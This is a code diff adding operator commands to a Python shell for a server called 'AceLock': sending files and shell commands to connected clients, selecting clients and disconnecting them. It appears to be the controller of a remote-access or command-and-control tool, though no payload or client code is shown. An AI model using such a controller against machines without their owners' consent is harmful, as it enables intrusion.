@@ -151,8 +151,217 @@ class CommandShell(cmd.Cmd):
         # Print summary
         print(f"Total clients: {len(self.server_object.clients)}")
         print()
-+
-    #send command
+
+    def do_send_file(self, args):
+        """
+        Send a file to the currently selected client or a specified client
+        Usage: send_file <file_path> [client_index]
+        Example: send_file /path/to/file.txt
+        Example: send_file /path/to/file.txt 1
+        """
+        if not self.server_running:
+            print("[!] Server not running. Use start_server first.")
+            return
+
+        if not self.server_object or not self.server_object.clients:
+            print("[!] No clients connected.")
+            return
+
+        # Parse arguments
+        try:
+            args_list = shlex.split(args)
+
+            # Check if we have at least the file path
+            if len(args_list) < 1:
+                print("[!] Invalid arguments. Usage: send_file <file_path> [client_index]")
+                return
+
+            file_path = args_list[0]
+            client_address = None
+
+            # If client index is provided, use it
+            if len(args_list) == 2:
+                try:
+                    client_index = int(args_list[1])
+                    if client_index < 1 or client_index > len(self.server_object.clients):
+                        print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
+                        return
+                    client_address = list(self.server_object.clients.keys())[client_index - 1]
+                except ValueError:
+                    print("[!] Client index must be a number")
+                    return
+            # Otherwise use the current client
+            else:
+                if not self.current_client:
+                    print("[!] No client selected. Use select_client first or specify a client index.")
+                    return
+
+                # Find the address for the current client socket
+                for address, socket in self.server_object.clients.items():
+                    if socket == self.current_client:
+                        client_address = address
+                        break
+
+                if not client_address:
+                    print("[!] Current client not found in active connections.")
+                    return
+
+            # Check if file exists
+            if not os.path.isfile(file_path):
+                print(f"[!] File not found: {file_path}")
+                return
+
+            print(f"[*] Sending file '{file_path}' to client {client_address}...")
+
+            # Call the server's send_file method
+            self.server_object.send_file(file_path, client_address)
+
+        except Exception as e:
+            print(f"[!] Error sending file: {e}")
+
+    def do_cmd(self, args):
+        """
+        Send a command to the currently selected client
+        Usage: send_command <command>
+        Example: send_command ls -la
+        """
+        if not self.server_running:
+            print("[!] Server not running. Use start_server first.")
+            return
+
+        if not self.server_object or not self.server_object.clients:
+            print("[!] No clients connected.")
+            return
+
+        if not self.current_client:
+            print("[!] No client selected. Use select_client first.")
+            return
+
+        if not args:
+            print("[!] No command provided. Usage: send_command <command>")
+            return
+
+        try:
+            # Find the address for the current client socket
+            client_address = None
+            for address, socket in self.server_object.clients.items():
+                if socket == self.current_client:
+                    client_address = address
+                    break
+
+            if not client_address:
+                print("[!] Current client not found in active connections.")
+                return
+
+            ip, port = client_address
+            print(f"[*] Sending command '{args}' to client {ip}:{port}...")
+
+            # Call the server's send_command method
+            self.server_object.send_command(args)
+
+        except Exception as e:
+            print(f"[!] Error sending command: {e}")
+
+    def do_select_client(self, args):
+        """
+        Select a client for interaction
+        Usage: select_client <client_index>
+        Example: select_client 1
+        """
+        if not self.server_running:
+            print("[!] Server not running. Use start_server first.")
+            return
+
+        if not self.server_object or not self.server_object.clients:
+            print("[!] No clients connected.")
+            return
+
+        try:
+            # Parse the client index
+            if not args:
+                print("[!] No client index provided. Usage: select_client <client_index>")
+                return
+
+            try:
+                client_index = int(args)
+                if client_index < 1 or client_index > len(self.server_object.clients):
+                    print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
+                    return
+            except ValueError:
+                print("[!] Client index must be a number")
+                return
+
+            # Get the client address and socket from the index
+            client_address = list(self.server_object.clients.keys())[client_index - 1]
+            client_socket = self.server_object.clients[client_address]
+
+            # Set the current client
+            self.current_client = client_socket
+
+            # Also update the server's current client for consistency
+            self.server_object.switch_connection(client_address)
+
+            ip, port = client_address
+            print(f"[+] Selected client: {ip}:{port}")
+
+        except Exception as e:
+            print(f"[!] Error selecting client: {e}")
+
+    def do_disconnect_client(self, args):
+        """
+        Forcibly disconnect a specific client
+        Usage: disconnect_client <client_index>
+        Example: disconnect_client 1
+        """
+        if not self.server_running:
+            print("[!] Server not running. Use start_server first.")
+            return
+
+        if not self.server_object or not self.server_object.clients:
+            print("[!] No clients connected.")
+            return
+
+        try:
+            # Parse the client index
+            if not args:
+                print("[!] No client index provided. Usage: disconnect_client <client_index>")
+                return
+
+            try:
+                client_index = int(args)
+                if client_index < 1 or client_index > len(self.server_object.clients):
+                    print(f"[!] Invalid client index. Must be between 1 and {len(self.server_object.clients)}")
+                    return
+            except ValueError:
+                print("[!] Client index must be a number")
+                return
+
+            # Get the client address and socket from the index
+            client_address = list(self.server_object.clients.keys())[client_index - 1]
+            client_socket = self.server_object.clients[client_address]
+
+            # Check if this is the current client
+            if self.current_client and self.current_client == client_socket:
+                self.current_client = None
+                print("[*] Current client selection cleared")
+
+            # Close the client socket
+            ip, port = client_address
+            print(f"[*] Disconnecting client: {ip}:{port}...")
+
+            try:
+                client_socket.close()
+                print(f"[+] Client {ip}:{port} disconnected")
+            except Exception as e:
+                print(f"[!] Error closing client socket: {e}")
+
+            # Remove the client from the server's clients dictionary
+            if client_address in self.server_object.clients:
+                del self.server_object.clients[client_address]
+                print(f"[+] Client {ip}:{port} removed from active connections")
+
+        except Exception as e:
+            print(f"[!] Error disconnecting client: {e}")
 
     def do_stop_server(self, args):
         """
@@ -174,7 +383,7 @@ class CommandShell(cmd.Cmd):
 
             # Reset client connection if server is stopped
             self.current_client = None
-              Exception as e:
+        except Exception as e:
             print(f"[!] Error stopping server: {e}")
 
     def do_exit(self, args):
@@ -186,3 +395,5 @@ class CommandShell(cmd.Cmd):
             self.do_stop_server(args)
         print("[+] Exiting AceLock command shell...")
         return True  # Return True to exit the cmd loop
+
+
